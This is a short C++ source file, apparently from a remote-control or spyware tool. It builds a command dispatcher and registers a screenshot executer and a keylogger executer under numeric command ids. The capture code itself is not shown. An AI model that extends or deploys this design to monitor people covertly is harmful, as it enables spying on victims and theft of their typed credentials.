#include "utils/builders.h"

#include "command/execute/ScreenshotExecuter.h"
#include "command/execute/KeyloggerExecuter.h"


command::ICommandExecuter*
utils::builders::BuildScreenshotExecuter()
{

    return ( new command::ScreenshotExecuter(1, "screenshot") );
}

command::ICommandExecuter*
utils::builders::BuildKeyloggerExecuter()
{
    return ( new command::KeyloggerExecuter(2, "keylogger") );
}

command::CommandDispatcher*
utils::builders::BuildDispatcher()
{
    command::CommandDispatcher *dispatcher = new command::CommandDispatcher();

    dispatcher->Add(BuildScreenshotExecuter());
    dispatcher->Add(BuildKeyloggerExecuter());

    return ( dispatcher );
}


